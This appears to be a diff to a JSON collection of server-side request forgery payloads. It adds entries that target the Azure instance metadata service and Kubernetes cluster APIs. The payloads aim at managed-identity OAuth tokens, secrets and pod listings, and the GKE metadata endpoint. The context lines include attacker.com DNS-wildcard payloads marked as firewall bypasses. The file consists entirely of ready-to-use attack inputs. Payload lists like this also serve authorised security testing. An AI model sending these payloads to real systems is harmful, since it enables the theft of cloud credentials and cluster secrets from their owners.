@@ -62,6 +62,24 @@
         {"payload": "http://169.254.169.254.attacker.com/", "description": "DNS wildcard resolving to metadata IP", "waf_bypass": true},
         {"payload": "http://127.0.0.1.attacker.com/", "description": "DNS wildcard resolving to localhost", "waf_bypass": true}
       ]
+    },
+    "azure": {
+      "description": "SSRF payloads targeting Azure Instance Metadata Service (IMDS)",
+      "payloads": [
+        {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "description": "Azure IMDS instance metadata (requires Metadata:true header)", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "description": "Azure managed identity OAuth token for ARM", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", "description": "Azure compute instance details (VM name, location, tags)", "waf_bypass": false}
+      ]
+    },
+    "kubernetes": {
+      "description": "SSRF payloads targeting Kubernetes service discovery and cluster APIs",
+      "payloads": [
+        {"payload": "http://kubernetes.default.svc/api/v1/namespaces", "description": "Kubernetes API namespace listing via internal DNS", "waf_bypass": false},
+        {"payload": "https://kubernetes.default.svc/api/v1/secrets", "description": "Kubernetes secrets enumeration (requires service account token)", "waf_bypass": false},
+        {"payload": "http://10.96.0.1:443/api/v1/namespaces", "description": "Kubernetes API via default ClusterIP service address", "waf_bypass": false},
+        {"payload": "https://kubernetes.default.svc/api/v1/pods", "description": "Kubernetes pod listing via internal DNS", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/computeMetadata/v1/", "description": "GKE metadata endpoint for Kubernetes on GCP", "waf_bypass": false}
+      ]
     }
   }
 }
